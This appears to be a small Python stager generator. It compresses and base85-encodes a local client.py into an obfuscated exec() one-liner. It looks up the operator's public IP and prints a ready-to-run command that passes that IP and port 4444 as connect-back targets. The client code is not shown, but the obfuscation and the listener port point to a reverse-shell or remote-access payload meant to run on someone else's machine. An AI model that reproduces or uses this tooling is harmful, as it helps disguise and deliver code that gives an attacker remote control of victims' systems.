import socket
import requests
import shlex
import zlib
import base64
import requests.packages.urllib3.util.connection as urllib3_cn


urllib3_cn.allowed_gai_family = lambda: socket.AF_INET


def boxing(port=4444):
    code = open("./client.py", "rb").read()
    ccode = base64.b85encode(zlib.compress(code)).decode()
    pycode = f"import zlib,base64;exec(zlib.decompress(base64.b85decode('{ccode}')))"

    # get public ip from https://ifconfig.me
    public_ip = requests.get("https://ifconfig.me/ip").text.strip()

    print(f"python3 -c {shlex.quote(pycode)} {public_ip} {port}")


if __name__ == "__main__":
    boxing()
